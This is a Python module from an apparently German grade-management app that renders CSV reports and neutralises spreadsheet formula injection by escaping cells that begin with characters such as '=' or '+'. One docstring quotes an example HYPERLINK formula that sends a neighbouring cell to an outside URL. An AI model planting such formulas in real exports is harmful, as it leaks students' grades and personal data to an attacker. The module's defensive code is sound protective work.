"""CSV report rendering, for spreadsheet download.

The one format still rendered server-side: a downloaded file has no frontend to
localise it, so column headers are translated here. The API passes the caller's
locale through as a header mapping.
"""

from __future__ import annotations

import csv
import io
from typing import Any

from notenverwaltung.reports.base import (
    CourseReport,
    ReportGenerator,
    StudentReport,
    SummaryReport,
)

DEFAULT_HEADERS: dict[str, str] = {
    "student_id": "Student ID",
    "student_name": "Student",
    "course_id": "Course ID",
    "course_name": "Course",
    "title": "Assessment",
    "score": "Score",
    "max_grade": "Max",
    "percentage": "Percent",
    "letter": "Grade",
    "weight": "Weight",
    "status": "Status",
    "date": "Date",
    "notes": "Notes",
    "metric": "Metric",
    "value": "Value",
    "rank": "Rank",
    "average": "Average",
}
"""English column headers. The API supplies a translated mapping per request."""

DEFAULT_LABELS: dict[str, str] = {"pass": "PASS", "fail": "FAIL"}
"""English cell values that are words. Translated per request, like the headers."""

#: Leading characters a spreadsheet reads as the start of a formula. The tab and
#: carriage return are here because Excel strips them and then looks at the next
#: character, so they smuggle the others past a naive check.
_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")


def _is_number(value: str) -> bool:
    """Whether a cell is a plain number, so a leading minus can be left alone."""
    try:
        float(value)
    except ValueError:
        return False
    return True


def escape_formula(value: Any) -> Any:
    """Neutralise a cell a spreadsheet would otherwise execute.

    These files are served as an attachment and open in Excel by design, and
    several of the columns are free text somebody else typed: a teacher writes
    ``grades.title`` and ``notes``, and any signed-in user writes their own
    ``full_name`` through their profile. ``=HYPERLINK("http://…"&A2,"Results")``
    in a title is a link that exfiltrates the row beside it when an administrator
    opens the export.

    A leading apostrophe is the conventional answer: Excel and LibreOffice both
    treat the rest as text and do not display it.

    Args:
        value: One cell, of any type the writer accepts.

    Returns:
        The cell, prefixed with an apostrophe when it would otherwise be read as
        a formula. Numbers are returned untouched, so a negative stays negative.
    """
    if not isinstance(value, str) or not value.startswith(_FORMULA_LEAD):
        return value
    if _is_number(value):
        return value
    return "'" + value


class SafeWriter:
    """A ``csv.writer`` that sends every cell through :func:`escape_formula`.

    Wrapping the writer rather than each call site means a row added later cannot
    forget -- which is the failure mode this whole class exists to make impossible.
    """

    def __init__(self, writer: Any) -> None:
        """Wrap a writer.

        Args:
            writer: The underlying ``csv.writer``.
        """
        self._writer = writer

    def writerow(self, row: list[Any]) -> None:
        """Write one row, escaped.

        Args:
            row: The cells.
        """
        self._writer.writerow([escape_formula(cell) for cell in row])

    def writerows(self, rows: list[list[Any]]) -> None:
        """Write several rows, escaped.

        Args:
            rows: The rows.
        """
        for row in rows:
            self.writerow(row)


class CsvReportGenerator(ReportGenerator):
    """Renders reports as CSV text."""

    def __init__(
        self,
        headers: dict[str, str] | None = None,
        delimiter: str = ",",
        labels: dict[str, str] | None = None,
    ) -> None:
        """Create a renderer.

        Args:
            headers: Override any of :data:`DEFAULT_HEADERS`.
            delimiter: Field separator. Pass ``";"`` for locales where Excel expects
                it — in German and French Windows locales a comma-separated file
                opens as a single column, which reads to the user as corruption.
            labels: Override any of :data:`DEFAULT_LABELS`. Cell values that are
                words rather than data. Translating the headers but leaving the
                cells English produces a German file with "FAIL" in it, which is
                worse than either consistent choice.
        """
        self.headers = {**DEFAULT_HEADERS, **(headers or {})}
        self.labels = {**DEFAULT_LABELS, **(labels or {})}
        self.delimiter = delimiter

    def _status(self, is_passing: bool) -> str:
        """Return the pass/fail cell in the caller's language.

        Args:
            is_passing: Whether the grade met the course's threshold.

        Returns:
            The translated label.
        """
        return self.labels["pass"] if is_passing else self.labels["fail"]

    def _writer(self, buffer: io.StringIO) -> SafeWriter:
        """Return a writer configured with this renderer's delimiter.

        Wrapped, so every row this class writes — and every row added to it later —
        has its cells checked for a leading formula character.
        """
        return SafeWriter(csv.writer(buffer, delimiter=self.delimiter, lineterminator="\n"))

    def _h(self, *keys: str) -> list[str]:
        """Translate a sequence of header keys."""
        return [self.headers.get(k, k) for k in keys]

    def render_student(self, report: StudentReport) -> str:
        """Render a student report as CSV: one row per grade."""
        buffer = io.StringIO()
        writer = self._writer(buffer)
        writer.writerow(
            self._h(
                "course_id",
                "course_name",
                "title",
                "score",
                "max_grade",
                "percentage",
                "letter",
                "weight",
                "status",
                "date",
                "notes",
            )
        )
        for g in report.grades:
            writer.writerow(
                [
                    g.course_id,
                    g.course_name,
                    g.title,
                    g.score,
                    g.max_grade,
                    f"{g.percentage:.2f}",
                    g.letter,
                    g.weight,
                    self._status(g.is_passing),
                    g.date,
                    g.notes,
                ]
            )
        return buffer.getvalue()

    def render_course(self, report: CourseReport) -> str:
        """Render a course report as CSV: one row per grade."""
        buffer = io.StringIO()
        writer = self._writer(buffer)
        writer.writerow(
            self._h(
                "student_id",
                "student_name",
                "title",
                "score",
                "max_grade",
                "percentage",
                "letter",
                "weight",
                "status",
                "date",
                "notes",
            )
        )
        for g in report.grades:
            writer.writerow(
                [
                    g.student_id,
                    g.student_name,
                    g.title,
                    g.score,
                    g.max_grade,
                    f"{g.percentage:.2f}",
                    g.letter,
                    g.weight,
                    self._status(g.is_passing),
                    g.date,
                    g.notes,
                ]
            )
        return buffer.getvalue()

    def render_summary(self, report: SummaryReport) -> str:
        """Render a summary report as CSV: a metric table, then rankings."""
        buffer = io.StringIO()
        writer = self._writer(buffer)

        writer.writerow(self._h("metric", "value"))
        writer.writerow(["students", report.student_count])
        writer.writerow(["courses", report.course_count])
        writer.writerow(["grades", report.grade_count])
        writer.writerow(
            [
                "average_percentage",
                f"{report.overall_average_percentage:.2f}"
                if report.overall_average_percentage is not None
                else "",
            ]
        )
        for label, count in report.distribution.items():
            writer.writerow([f"band_{label}", count])

        if report.top_students:
            writer.writerow([])
            writer.writerow(self._h("rank", "student_id", "student_name", "average"))
            for rank, (student_id, name, avg) in enumerate(report.top_students, start=1):
                writer.writerow([rank, student_id, name, f"{avg:.2f}"])

        if report.at_risk_students:
            writer.writerow([])
            writer.writerow(self._h("student_id", "student_name", "average"))
            for student_id, name, avg in report.at_risk_students:
                writer.writerow([student_id, name, f"{avg:.2f}"])

        return buffer.getvalue()
